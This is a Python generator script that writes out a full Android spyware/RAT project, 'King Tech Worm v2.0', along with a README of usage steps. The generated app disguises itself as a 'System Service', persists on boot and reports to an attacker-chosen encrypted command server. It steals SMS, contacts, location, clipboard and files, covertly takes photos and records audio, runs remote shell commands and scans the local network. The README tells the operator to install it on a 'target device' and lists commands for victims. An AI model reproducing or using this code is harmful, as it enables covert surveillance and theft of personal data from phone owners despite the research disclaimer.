#!/usr/bin/env python3
"""
King Tech Worm v2.0 - Advanced Android Payload Generator
Generates a full Android Studio project with encrypted C2, SMS/Contacts/GPS/Keylog/Files stealer.
For authorized security research only.
"""

import sys
import os
from pathlib import Path

def generate(ip: str, port: int):
    project = Path("KingTech_Worm_Payload_v2")
    if project.exists():
        import shutil
        shutil.rmtree(project)

    # Directory structure
    dirs = [
        "app/src/main/java/com/king/tech/worm",
        "app/src/main/res/xml",
        "app/src/main/res/values",
        "app/src/main/res/drawable",
        "gradle/wrapper",
    ]
    for d in dirs:
        (project / d).mkdir(parents=True, exist_ok=True)

    # ========== settings.gradle ==========
    (project / "settings.gradle").write_text("rootProject.name = 'KingTechWorm'\ninclude ':app'\n")

    # ========== build.gradle (project) ==========
    (project / "build.gradle").write_text("""
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:7.4.2'
    }
}
allprojects {
    repositories {
        google()
        mavenCentral()
    }
}
task clean(type: Delete) {
    delete rootProject.buildDir
}
""")

    # ========== app/build.gradle ==========
    (project / "app/build.gradle").write_text("""
plugins {
    id 'com.android.application'
}
android {
    compileSdk 33
    defaultConfig {
        applicationId "com.king.tech.worm"
        minSdk 24
        targetSdk 33
        versionCode 2
        versionName "2.0"
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
}
""")

    # ========== AndroidManifest.xml ==========
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.king.tech.worm">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-feature android:name="android.hardware.camera" android:required="false"/>
    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>

    <application
        android:allowBackup="false"
        android:icon="@android:drawable/ic_menu_camera"
        android:label="System Service"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.NoDisplay"
        android:usesCleartextTraffic="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
            android:name=".WormService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync"/>

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>

        <receiver
            android:name=".SmsReceiver"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
'''
    (project / "app/src/main/AndroidManifest.xml").write_text(manifest)

    # ========== MainActivity.java ==========
    main_activity = '''package com.king.tech.worm;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.WindowManager;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);

        // Request ignore battery optimizations
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                try { startActivity(intent); } catch (Exception ignored) {}
            }
        }

        // Start service
        Intent svc = new Intent(this, WormService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        // Hide launcher icon (optional - requires reinstall to reverse)
        // getPackageManager().setComponentEnabledSetting(
        //     getComponentName(),
        //     android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        //     android.content.pm.PackageManager.DONT_KILL_APP);

        finish();
    }
}
'''
    (project / "app/src/main/java/com/king/tech/worm/MainActivity.java").write_text(main_activity)

    # ========== BootReceiver.java ==========
    boot = '''package com.king.tech.worm;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent svc = new Intent(context, WormService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(svc);
        } else {
            context.startService(svc);
        }
    }
}
'''
    (project / "app/src/main/java/com/king/tech/worm/BootReceiver.java").write_text(boot)

    # ========== SmsReceiver.java ==========
    sms_recv = '''package com.king.tech.worm;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null &&
            intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder sb = new StringBuilder();
                    for (Object pdu : pdus) {
                        SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                        sb.append("From: ").append(msg.getDisplayOriginatingAddress())
                          .append("\\n").append(msg.getDisplayMessageBody()).append("\\n\\n");
                    }
                    // Forward to service if running
                    Intent i = new Intent(context, WormService.class);
                    i.putExtra("incoming_sms", sb.toString());
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            context.startForegroundService(i);
                        } else {
                            context.startService(i);
                        }
                    } catch (Exception ignored) {}
                }
            }
        }
    }
}
'''
    (project / "app/src/main/java/com/king/tech/worm/SmsReceiver.java").write_text(sms_recv)

    # ========== WormService.java (Core - Advanced) ==========
    service = f'''package com.king.tech.worm;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Base64;
import android.view.Surface;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class WormService extends Service {{
    private static final String C2_HOST = "{ip}";
    private static final int C2_PORT = {port};
    private static final String AES_PASS = "K1ngT3chW0rmX_SecretKey_2026";

    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private Thread worker;
    private boolean running = true;
    private StringBuilder keylogBuffer = new StringBuilder();

    @Override
    public void onCreate() {{
        super.onCreate();
        startForegroundNotif();
        worker = new Thread(this::connectionLoop);
        worker.start();
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        if (intent != null && intent.hasExtra("incoming_sms")) {{
            String sms = intent.getStringExtra("incoming_sms");
            sendEncrypted("sms", sms);
        }}
        return START_STICKY;
    }}

    private void startForegroundNotif() {{
        String channelId = "sys_service_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(channelId, "System Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }}
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            builder = new Notification.Builder(this, channelId);
        }} else {{
            builder = new Notification.Builder(this);
        }}
        Notification notif = builder
                .setContentTitle("System Update")
                .setContentText("Running security checks...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
        startForeground(101, notif);
    }}

    private void connectionLoop() {{
        while (running) {{
            try {{
                socket = new Socket();
                socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 10000);
                socket.setSoTimeout(0);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Send hello
                JSONObject hello = new JSONObject();
                hello.put("type", "hello");
                JSONObject info = new JSONObject();
                info.put("model", Build.MODEL);
                info.put("android", Build.VERSION.RELEASE);
                info.put("sdk", Build.VERSION.SDK_INT);
                info.put("device", Build.DEVICE);
                info.put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                hello.put("data", info);
                sendRaw(hello.toString());

                // Command loop
                String line;
                while (running && (line = in.readLine()) != null) {{
                    String decrypted = decrypt(line);
                    if (decrypted == null || decrypted.isEmpty()) continue;
                    try {{
                        JSONObject cmd = new JSONObject(decrypted);
                        handleCommand(cmd);
                    }} catch (Exception e) {{}}
                }}
            }} catch (Exception e) {{
                // reconnect after delay
            }} finally {{
                closeQuietly();
            }}
            try {{ Thread.sleep(8000); }} catch (Exception ignored) {{}}
        }}
    }}

    private void handleCommand(JSONObject cmd) {{
        String type = cmd.optString("type", "");
        JSONArray args = cmd.optJSONArray("args");
        try {{
            switch (type) {{
                case "info":
                    sendDeviceInfo();
                    break;
                case "photo":
                    boolean back = args != null && args.length() > 0 && "back".equals(args.optString(0));
                    takePhoto(back);
                    break;
                case "audio":
                    int secs = 10;
                    if (args != null && args.length() > 0) secs = args.optInt(0, 10);
                    recordAudio(secs);
                    break;
                case "sms":
                    stealSms();
                    break;
                case "contacts":
                    stealContacts();
                    break;
                case "location":
                    getLocation();
                    break;
                case "keylog":
                    sendEncrypted("keylog", keylogBuffer.toString());
                    keylogBuffer.setLength(0);
                    break;
                case "apps":
                    listApps();
                    break;
                case "clipboard":
                    getClipboard();
                    break;
                case "files":
                    String path = Environment.getExternalStorageDirectory().getAbsolutePath();
                    if (args != null && args.length() > 0) path = args.optString(0, path);
                    listFiles(path);
                    break;
                case "download":
                    if (args != null && args.length() > 0) downloadFile(args.optString(0));
                    break;
                case "shell":
                    if (args != null && args.length() > 0) {{
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < args.length(); i++) sb.append(args.optString(i)).append(" ");
                        execShell(sb.toString().trim());
                    }}
                    break;
                case "worm":
                    wormScan();
                    break;
                case "kill":
                    running = false;
                    stopSelf();
                    break;
            }}
        }} catch (Exception e) {{}}
    }}

    // ==================== STEALERS ====================
    private void stealSms() {{
        new Thread(() -> {{
            try {{
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI,
                        new String[]{{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE}},
                        null, null, Telephony.Sms.DATE + " DESC LIMIT 80");
                if (c != null) {{
                    while (c.moveToNext()) {{
                        sb.append("From: ").append(c.getString(0))
                          .append("\\n").append(c.getString(1))
                          .append("\\n---\\n");
                    }}
                    c.close();
                }}
                sendEncrypted("sms", sb.toString());
            }} catch (Exception e) {{
                sendEncrypted("sms", "Error: " + e.getMessage());
            }}
        }}).start();
    }}

    private void stealContacts() {{
        new Thread(() -> {{
            try {{
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                ContactsContract.CommonDataKinds.Phone.NUMBER}}, null, null, null);
                if (c != null) {{
                    while (c.moveToNext()) {{
                        sb.append(c.getString(0)).append(" : ").append(c.getString(1)).append("\\n");
                    }}
                    c.close();
                }}
                sendEncrypted("contacts", sb.toString());
            }} catch (Exception e) {{
                sendEncrypted("contacts", "Error: " + e.getMessage());
            }}
        }}).start();
    }}

    private void getLocation() {{
        new Thread(() -> {{
            try {{
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                Location loc = null;
                if (lm != null) {{
                    loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }}
                if (loc != null) {{
                    String data = "Lat: " + loc.getLatitude() + " Lon: " + loc.getLongitude()
                            + " Acc: " + loc.getAccuracy();
                    sendEncrypted("location", data);
                }} else {{
                    sendEncrypted("location", "No location available");
                }}
            }} catch (Exception e) {{
                sendEncrypted("location", "Error: " + e.getMessage());
            }}
        }}).start();
    }}

    private void listApps() {{
        new Thread(() -> {{
            try {{
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                StringBuilder sb = new StringBuilder();
                for (ApplicationInfo app : apps) {{
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {{
                        sb.append(pm.getApplicationLabel(app)).append(" | ").append(app.packageName).append("\\n");
                    }}
                }}
                sendEncrypted("apps", sb.toString());
            }} catch (Exception e) {{
                sendEncrypted("apps", "Error");
            }}
        }}).start();
    }}

    private void getClipboard() {{
        try {{
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip().getItemCount() > 0) {{
                CharSequence text = cm.getPrimaryClip().getItemAt(0).getText();
                sendEncrypted("clipboard", text != null ? text.toString() : "");
            }} else {{
                sendEncrypted("clipboard", "Empty");
            }}
        }} catch (Exception e) {{
            sendEncrypted("clipboard", "Error");
        }}
    }}

    private void listFiles(String path) {{
        new Thread(() -> {{
            try {{
                File dir = new File(path);
                File[] files = dir.listFiles();
                StringBuilder sb = new StringBuilder();
                if (files != null) {{
                    for (File f : files) {{
                        sb.append(f.isDirectory() ? "[D] " : "[F] ")
                          .append(f.getName())
                          .append(" (").append(f.length()).append(")\\n");
                    }}
                }}
                sendEncrypted("filelist", sb.toString());
            }} catch (Exception e) {{
                sendEncrypted("filelist", "Error: " + e.getMessage());
            }}
        }}).start();
    }}

    private void downloadFile(String path) {{
        new Thread(() -> {{
            try {{
                File f = new File(path);
                if (!f.exists() || !f.isFile()) {{
                    sendEncrypted("shell", "File not found");
                    return;
                }}
                FileInputStream fis = new FileInputStream(f);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
                fis.close();
                String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                JSONObject r = new JSONObject();
                r.put("type", "download");
                r.put("name", f.getName());
                r.put("data", b64);
                sendRaw(encrypt(r.toString()));
            }} catch (Exception e) {{
                sendEncrypted("shell", "Download error: " + e.getMessage());
            }}
        }}).start();
    }}

    private void execShell(String command) {{
        new Thread(() -> {{
            try {{
                Process p = Runtime.getRuntime().exec(new String[]{{"sh", "-c", command}});
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line).append("\\n");
                while ((line = err.readLine()) != null) sb.append(line).append("\\n");
                p.waitFor();
                sendEncrypted("shell", sb.toString());
            }} catch (Exception e) {{
                sendEncrypted("shell", "Error: " + e.getMessage());
            }}
        }}).start();
    }}

    // ==================== CAMERA / MIC ====================
    private void takePhoto(boolean useBack) {{
        new Thread(() -> {{
            Camera camera = null;
            try {{
                int cameraId = useBack ? 0 : 1; // 0 back, 1 front usually
                camera = Camera.open(cameraId);
                SurfaceTexture st = new SurfaceTexture(0);
                camera.setPreviewTexture(st);
                camera.startPreview();
                Thread.sleep(600);
                camera.takePicture(null, null, (data, cam) -> {{
                    try {{
                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        sendEncrypted("photo", b64);
                    }} catch (Exception e) {{}}
                    finally {{
                        try {{ cam.release(); }} catch (Exception ignored) {{}}
                    }}
                }});
            }} catch (Exception e) {{
                if (camera != null) try {{ camera.release(); }} catch (Exception ignored) {{}}
                sendEncrypted("photo", "");
            }}
        }}).start();
    }}

    private void recordAudio(int seconds) {{
        new Thread(() -> {{
            MediaRecorder rec = null;
            try {{
                File outFile = new File(getCacheDir(), "rec.3gp");
                rec = new MediaRecorder();
                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
                rec.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                rec.setOutputFile(outFile.getAbsolutePath());
                rec.prepare();
                rec.start();
                Thread.sleep(seconds * 1000L);
                rec.stop();
                rec.release();
                FileInputStream fis = new FileInputStream(outFile);
                byte[] data = new byte[(int) outFile.length()];
                fis.read(data);
                fis.close();
                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                sendEncrypted("audio", b64);
                outFile.delete();
            }} catch (Exception e) {{
                if (rec != null) try {{ rec.release(); }} catch (Exception ignored) {{}}
            }}
        }}).start();
    }}

    private void wormScan() {{
        new Thread(() -> {{
            try {{
                String local = getLocalIp();
                String subnet = local.substring(0, local.lastIndexOf('.') + 1);
                int found = 0;
                for (int i = 1; i < 255; i++) {{
                    final String target = subnet + i;
                    if (target.equals(local)) continue;
                    try {{
                        Socket s = new Socket();
                        s.connect(new InetSocketAddress(target, 4444), 180);
                        s.close();
                        found++;
                    }} catch (Exception ignored) {{}}
                }}
                sendEncrypted("worm_report", "Scanned subnet " + subnet + "x - open 4444: " + found);
            }} catch (Exception e) {{
                sendEncrypted("worm_report", "Worm error");
            }}
        }}).start();
    }}

    private void sendDeviceInfo() {{
        try {{
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            sendEncrypted("info", info.toString());
        }} catch (Exception e) {{}}
    }}

    // ==================== CRYPTO ====================
    private byte[] getKey() {{
        try {{
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            return md.digest(AES_PASS.getBytes("UTF-8"));
        }} catch (Exception e) {{
            return new byte[32];
        }}
    }}

    private String encrypt(String plain) {{
        try {{
            byte[] key = getKey();
            byte[] iv = new byte[16];
            new java.security.SecureRandom().nextBytes(iv);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
            byte[] ct = cipher.doFinal(plain.getBytes("UTF-8"));
            byte[] combined = new byte[iv.length + ct.length];
            System.arraycopy(iv, 0, combined, 0, iv.length);
            System.arraycopy(ct, 0, combined, iv.length, ct.length);
            return Base64.encodeToString(combined, Base64.NO_WRAP);
        }} catch (Exception e) {{
            return "";
        }}
    }}

    private String decrypt(String b64) {{
        try {{
            byte[] raw = Base64.decode(b64, Base64.NO_WRAP);
            byte[] iv = new byte[16];
            byte[] ct = new byte[raw.length - 16];
            System.arraycopy(raw, 0, iv, 0, 16);
            System.arraycopy(raw, 16, ct, 0, ct.length);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(getKey(), "AES"), new IvParameterSpec(iv));
            return new String(cipher.doFinal(ct), "UTF-8");
        }} catch (Exception e) {{
            return null;
        }}
    }}

    private void sendEncrypted(String type, String data) {{
        try {{
            JSONObject r = new JSONObject();
            r.put("type", type);
            r.put("data", data);
            sendRaw(encrypt(r.toString()));
        }} catch (Exception e) {{}}
    }}

    private void sendRaw(String data) {{
        try {{
            if (out != null) {{
                out.println(data);
                out.flush();
            }}
        }} catch (Exception e) {{}}
    }}

    private String getLocalIp() {{
        try {{
            Socket s = new Socket("8.8.8.8", 53);
            String ip = s.getLocalAddress().getHostAddress();
            s.close();
            return ip;
        }} catch (Exception e) {{
            return "0.0.0.0";
        }}
    }}

    private void closeQuietly() {{
        try {{ if (in != null) in.close(); }} catch (Exception ignored) {{}}
        try {{ if (out != null) out.close(); }} catch (Exception ignored) {{}}
        try {{ if (socket != null) socket.close(); }} catch (Exception ignored) {{}}
    }}

    @Override
    public IBinder onBind(Intent intent) {{ return null; }}

    @Override
    public void onDestroy() {{
        running = false;
        closeQuietly();
        super.onDestroy();
    }}
}}
'''
    (project / "app/src/main/java/com/king/tech/worm/WormService.java").write_text(service)

    # ========== strings.xml ==========
    (project / "app/src/main/res/values/strings.xml").write_text('''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Service</string>
</resources>
''')

    # ========== README ==========
    readme = f"""King Tech Worm v2.0 - Advanced Edition
=====================================

Files:
- c2/king_tech_worm_v2.py          → Encrypted C2 Server
- payload_generator/generate_android_worm_v2.py → Payload Generator

Requirements (Kali):
  pip install pycryptodome colorama

How to use:
1. python3 generate_android_worm_v2.py <YOUR_IP> 4444
2. Open the generated folder KingTech_Worm_Payload_v2 in Android Studio
3. Build → Generate Signed APK (or debug APK)
4. On Kali: sudo python3 king_tech_worm_v2.py
5. Install APK on target device and grant permissions

New Features in v2:
- AES-256 encrypted C2 traffic
- SMS stealer
- Contacts stealer
- GPS location
- Installed apps list
- Clipboard stealer
- File listing + download
- Remote shell
- Camera (front/back)
- Audio recording
- Better persistence (Boot + Foreground Service)
- Auto reconnect
- Network scanner on C2
- Broadcast commands to all victims

Commands:
  list
  scan 192.168.1.0/24
  <id> photo
  <id> photo back
  <id> audio 15
  <id> sms
  <id> contacts
  <id> location
  <id> apps
  <id> clipboard
  <id> files /sdcard/
  <id> shell id
  <id> worm
  broadcast sms
  help

Disclaimer: For authorized security research and educational purposes only.
"""
    (project.parent / "docs" / "README_v2.txt").write_text(readme)

    print("[+] King Tech Worm v2.0 Payload generated successfully!")
    print(f"[+] Project folder: {project.absolute()}")
    print(f"[+] C2 set to {ip}:{port}")
    print("[+] Open in Android Studio → Build APK")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 generate_android_worm_v2.py <YOUR_KALI_IP> <PORT>")
        print("Example: python3 generate_android_worm_v2.py 192.168.1.10 4444")
        sys.exit(1)
    generate(sys.argv[1], int(sys.argv[2]))
'''
